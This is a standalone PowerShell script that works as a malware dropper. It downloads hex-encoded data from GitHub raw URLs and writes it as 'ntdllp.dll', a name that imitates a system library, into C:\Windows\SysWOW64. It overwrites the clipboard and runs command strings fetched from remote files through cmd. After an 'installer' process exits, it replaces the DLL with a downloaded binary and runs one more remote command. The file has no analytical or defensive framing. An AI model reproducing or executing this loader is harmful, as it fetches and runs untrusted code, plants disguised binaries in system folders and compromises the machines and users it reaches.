$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://github.com/devnull-sys/files/raw/refs/heads/main/ntdllp.dll"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"

function HexToBytes {
    param([string]$hexStr)
    $hexStr = $hexStr.Trim()
    $hexStr = $hexStr -replace '\s', ''
    $byteArr = [byte[]]::new($hexStr.Length / 2)
    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
    }
    return $byteArr
}

try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing
    if ($responseA.StatusCode -eq 200) {
        $hexContent = $responseA.Content.Trim()
        $hexContent = $hexContent -replace '\s', ''
        if ($hexContent -and $hexContent.Length % 2 -eq 0) {
            $bytes = HexToBytes $hexContent
            [IO.File]::WriteAllBytes($filePath, $bytes)
            $writtenBytes = [IO.File]::ReadAllBytes($filePath)
            if ([System.Linq.Enumerable]::SequenceEqual($bytes, $writtenBytes)) {
            } else {
                exit 1
            }
        }
    }
} catch {
    exit 1
}

Set-Clipboard $clipText

try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing
    if ($responseB.StatusCode -eq 200) {
        $cmdToRun = $responseB.Content.Trim()
        if ($cmdToRun) {
            Start-Process cmd -ArgumentList "/c $cmdToRun" -Wait -NoNewWindow
        }
    }
} catch {
    exit 1
}

do {
    Start-Sleep -Milliseconds 500
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)

do {
    Start-Sleep -Milliseconds 100
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)

try {
    Invoke-WebRequest -Uri $urlC -OutFile $filePath -UseBasicParsing
} catch {
    exit 1
}

try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing
    if ($responseD.StatusCode -eq 200) {
        $finalCmd = $responseD.Content.Trim()
        if ($finalCmd) {
            Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
        }
    }
} catch {
    exit 1
}
